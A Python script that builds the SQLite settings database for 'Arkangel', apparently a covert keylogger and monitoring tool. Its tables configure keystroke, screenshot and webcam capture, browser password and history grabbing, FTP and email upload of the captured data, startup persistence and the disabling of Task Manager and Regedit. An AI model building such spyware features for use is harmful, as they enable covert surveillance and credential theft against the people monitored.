import sqlite3


db = open("database.db",'a+')
db.close()

conn = sqlite3.connect("database.db")

#conn.row_factory = lambda cursor, row: row[0]

c = conn.cursor()

try:
    # Users table
    # password is a hash string
    c.execute('''CREATE TABLE IF NOT EXISTS Users
            ( id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE, password TEXT NOT NULL )''')
    #General table '
    c.execute('''CREATE TABLE IF NOT EXISTS General
              (id INTEGER NOT NULL UNIQUE ,
              disTaskManager INTEGER NOT NULL DEFAULT 0,
            disRegedit INTEGER NOT NULL DEFAULT 0,
            encrlog INTEGER NOT NULL DEFAULT 0,
            startup INTEGER NOT NULL DEFAULT 0,
            enHotKey INTEGER NOT NULL DEFAULT 0,
            hotkey TEXT DEFAULT "CTRL+CAPSLOCK"
             , FOREIGN KEY (id) REFERENCES Users(id))''')
    #FTP table '
    c.execute('''CREATE TABLE IF NOT EXISTS FTP
             (id INTEGER NOT NULL UNIQUE,
             enable INTEGER NOT NULL DEFAULT 0,
             hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0,
            upKeystroke INTEGER NOT NULL DEFAULT 0,
            upScrshot INTEGER NOT NULL DEFAULT 0,
            upWebcam INTEGER NOT NULL DEFAULT 0,
            upWebsite INTEGER NOT NULL DEFAULT 0,
            upSize INTEGER NOT NULL DEFAULT 0,
            size INTEGER DEFAULT 5000,
            clear INTEGER NOT NULL DEFAULT 0
             , FOREIGN KEY (id) REFERENCES Users(id))''')
    # FTP server '
    c.execute('''CREATE TABLE IF NOT EXISTS FTPServer
            (id INTEGER NOT NULL UNIQUE,
            hostname TEXT DEFAULT "ftp.example.com",
            uname TEXT DEFAULT "username",
            password TEXT DEFAULT "password",
            dir TEXT DEFAULT "/", passiveMode INTEGER DEFAULT 1
            , FOREIGN KEY (id) REFERENCES Users(id))''')
    
    #webcam table ''
    c.execute('''CREATE TABLE IF NOT EXISTS Webcam
             (id INTEGER NOT NULL UNIQUE ,
             enable INTEGER NOT NULL DEFAULT 0,
             hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0,
             enDelEvery INTEGER NOT NULL DEFAULT 0,
             days INTEGER DEFAULT 3,
             datetime TEXT DEFAULT "1-Jan-18 11:11:11 PM",
             enDelAfterUpload INTEGER DEFAULT 0,
             FOREIGN KEY (id) REFERENCES Users(id))''')
    
    #Target table '
    c.execute('''CREATE TABLE IF NOT EXISTS Targets
             (id INTEGER NOT NULL UNIQUE,
             enAllApp INTEGER NOT NULL DEFAULT 1,
            enFollowApp INTEGER NOT NULL DEFAULT 0,
            FOREIGN KEY (id) REFERENCES Users(id))''')
    #Target list table '
    c.execute('''CREATE TABLE IF NOT EXISTS TargetList
             (id INTEGER NOT NULL,
             byApp TEXT NOT NULL DEFAULT "shell",
             byName TEXT NOT NULL DEFAULT "shell",
             FOREIGN KEY (id) REFERENCES Users(id))''')
    
    #screenshot table '
    c.execute('''CREATE TABLE IF NOT EXISTS Screenshot
             (id INTEGER NOT NULL UNIQUE,
             enable INTEGER NOT NULL DEFAULT 0,
             timeNuser INTEGER NOT NULL DEFAULT 0,
             doubleScr INTEGER NOT NULL DEFAULT 1,
             enDel INTEGER NOT NULL DEFAULT 0,
             daysDel INTEGER NOT NULL DEFAULT 3,
            hours INTEGER DEFAULT 1,
            minutes INTEGER DEFAULT 0
             , quality INTEGER DEFAULT 50,
             datetime TEXT NOT NULL DEFAULT "1-Jan-18 11:11:11 PM"
             , FOREIGN KEY (id) REFERENCES Users(id))''')    
    #Email table'
    c.execute('''CREATE TABLE IF NOT EXISTS Email
             (id INTEGER NOT NULL UNIQUE,
             enable INTEGER NOT NULL DEFAULT 0,
            hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0,
            upKeystroke INTEGER NOT NULL DEFAULT 0,
            upScrshot INTEGER NOT NULL DEFAULT 0,
            upWebcam INTEGER NOT NULL DEFAULT 0,
            upWebsite INTEGER NOT NULL DEFAULT 0,
            enLimit INTEGER NOT NULL DEFAULT 0,
            limitSize INTEGER DEFAULT 5000,
            clear INTEGER NOT NULL DEFAULT 0,
            enZipPass INTEGER NOT NULL DEFAULT 0,
            zipPasswd TEXT, FOREIGN KEY (id) REFERENCES Users(id))''')
    #Email Delivery '
    c.execute('''CREATE TABLE IF NOT EXISTS EmailDelivery
            ( id INTEGER NOT NULL UNIQUE,
            sendto TEXT DEFAULT "userA@gmail.com"
            , smpt TEXT DEFAULT "smtp.gmail.com",
            port INTEGER DEFAULT 587,
            uname TEXT DEFAULT "userB@gmail.com",
            password TEXT DEFAULT "password",
            subject TEXT DEFAULT "Message from Arkangel!",
            FOREIGN KEY (id) REFERENCES Users(id))''')

    #Alerts table '
    c.execute('''CREATE TABLE IF NOT EXISTS Alerts
             (id INTEGER NOT NULL UNIQUE ,
             sendMail INTEGER NOT NULL DEFAULT 1,
             scrShot INTEGER NOT NULL DEFAULT 1,
             FOREIGN KEY (id) REFERENCES Users(id))''')
    #Alerts list table '
    c.execute('''CREATE TABLE IF NOT EXISTS AlertList
             (id INTEGER NOT NULL,
             key TEXT NOT NULL DEFAULT "password",
             FOREIGN KEY (id) REFERENCES Users(id))''')

    #web usgae
    c.execute('''CREATE TABLE IF NOT EXISTS webusage
            (id INTEGER NOT NULL,
                getHistory INTEGER NOT NULL DEFAULT 0,
                getBookmark INTEGER NOT NULL DEFAULT 0,
                getPassword INTEGER NOT NULL DEFAULT 0,
            FOREIGN KEY (id) REFERENCES Users(id))''')

    #current user
    c.execute('''CREATE TABLE IF NOT EXISTS current_user
            (id INTEGER, token TEXT NOT NULL
            ,FOREIGN KEY (id) REFERENCES Users(id))''')

    #user monitoring
    # enable : 1 - monitor all user
    #           2 - monitor current user
    #           3 - monitor following user
    c.execute('''CREATE TABLE IF NOT EXISTS monitor_user
            (id INTEGER NOT NULL UNIQUE, enable INTEGER NOT NULL DEFAULT 1,
            current_user TEXT DEFAULT "Administrator",
            FOREIGN KEY (id) REFERENCES Users(id)) ''')
    #user monitorinng list
    c.execute('''CREATE TABLE IF NOT EXISTS user_list
            (id INTEGER NOT NULL, user TEXT,
                FOREIGN KEY (id) REFERENCES Users(id))
            ''')

    
    #advanced setting
        # keystroke mode 0: english
        #                1: vietnamese
    c.execute('''CREATE TABLE IF NOT EXISTS Setting
            (id INTEGER NOT NULL UNIQUE,
            textLog TEXT NOT NULL DEFAULT "C:\Program Files\Arkangel Team\Arkangel\Logs",
            webcamLog TEXT NOT NULL DEFAULT "C:\Program Files\Arkangel Team\Arkangel\Logs",
            screenshotLog TEXT NOT NULL DEFAULT "C:\Program Files\Arkangel Team\Arkangel\Logs",
            keystrokeMode INTEGER NOT NULL DEFAULT 0,
            websiteLog TEXT NOT NULL DEFAULT "C:\Program Files\Arkangel Team\Arkangel\Logs",
            profilePath TEXT NOT NULL DEFAULT 
            "\\AppData\\Local\\Google\\Chrome\\User Data\\Default",
            FOREIGN KEY (id) REFERENCES Users(id))
            ''')
    
    
    # add triger auto load default config
    c.execute('''CREATE TRIGGER IF NOT EXISTS aft_insert AFTER INSERT ON Users
        BEGIN
            INSERT INTO General(id) VALUES (NEW.id);
            
            INSERT INTO FTP(id) VALUES (NEW.id);
            INSERT INTO FTPServer(id) VALUES (NEW.id);
            
            INSERT INTO Webcam(id) VALUES (NEW.id);
            
            INSERT INTO Targets(id) VALUES (NEW.id);
            INSERT INTO TargetList(id) VALUES (NEW.id);
            
            INSERT INTO Screenshot(id) VALUES (NEW.id);
            
            INSERT INTO Email(id) VALUES (NEW.id);
            INSERT INTO EmailDelivery(id) VALUES (NEW.id);
            
            INSERT INTO Alerts(id) VALUES (NEW.id);
            INSERT INTO AlertList(id) VALUES (NEW.id);

            INSERT INTO monitor_user(id) VALUES(NEW.id);
            
            INSERT INTO Setting (id) VALUES (NEW.id);

            INSERT INTO webusage (id) VALUES (NEW.id);

        END; ''')
    
except Exception as ex:
    print(ex)




##c.execute('''
##UPDATE Targets SET enAllApp = 0, enFollowApp =1
##WHERE id =(SELECT current_user.id from current_user)
##''')

# Insert a row of data
#c.execute("UPDATE current_user SET token = '5b42d37e3e04900f1c19eba4'")
c.execute("INSERT INTO Users(username, password) VALUES ('bla','dhoqidnkew')")

c.execute("INSERT INTO current_user(id,token) VALUES (1,'abc')")

##c.execute('''UPDATE Users SET username = 'zxc@gmail.com',password = '123456789'
##WHERE id =(SELECT current_user.id from current_user)''')

#c.execute("INSERT INTO Users VALUES (123,'user02','user02')")
#r = c.execute('SELECT * FROM Users').fetchall()
##c.execute('''UPDATE FTPServer SET dir = '\\test'
##WHERE id = (SELECT current_user.id from current_user)''')
##
##c.execute('''UPDATE FTP SET enable = 1,upKeystroke = 1, upScrshot = 1,
##            upWebcam = 1, upWebsite = 1,
##            upSize = 0,  clear = 1
##            WHERE id = (SELECT current_user.id from current_user) ''')
##
#c.execute('''UPDATE Email SET enable = 1, upKeystroke = 1, upScrshot = 1,
#            upWebcam = 1, upWebsite = 1,
#            enLimit = 0,
#            clear = 0 WHERE id = (SELECT current_user.id from current_user) ''')

##c.execute('''UPDATE Webcam SET enDelAfterUpload = 1
##    WHERE id = (SELECT current_user.id from current_user) ''')
##
##c.execute('''UPDATE Setting SET profilePath =
##            "\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 7"
##            WHERE id = (SELECT current_user.id from current_user)''');

###print(c.execute('SELECT * from Setting').fetchall())
##c.execute('UPDATE Targets SET enAllApp = 0,enFollowApp = 1 WHERE id = 1');
##
###print(c.execute('SELECT * FROM Targets').fetchall())
#----------------------
#c.execute("INSERT INTO Alerts VALUES (1,0,1)")
#s = c.execute('SELECT * FROM Alerts WHERE id =1').fetchone()
#print(s[0])
#c.execute("INSERT INTO AlertList VALUES (1,'pass')")
#print(c.execute('SELECT * FROM AlertList').fetchall())
#----------------------
#c.execute("INSERT INTO Targets VALUES (1,0,1)")
#c.execute("INSERT INTO TargetList VALUES (1,'notepad','notepad')")
#print(c.execute('SELECT * FROM TargetList WHERE id = 1').fetchall())
#print(c.execute('SELECT * FROM Targets WHERE id = 1').fetchone())
#c.execute("INSERT INTO current_user VALUES (1)")
#print(c.execute('SELECT * FROM current_user').fetchone()[0])
#print(c.execute('SELECT * FROM setting').fetchall())
# Save (commit) the changes
conn.commit()
'''
c.execute('SELECT key FROM Alerts')
listAlert = c.fetchall()

print(listAlert[0])
'''      
# We can also close the connection if we are done with it.
# Just be sure any changes have been committed or they will be lost.
conn.close()
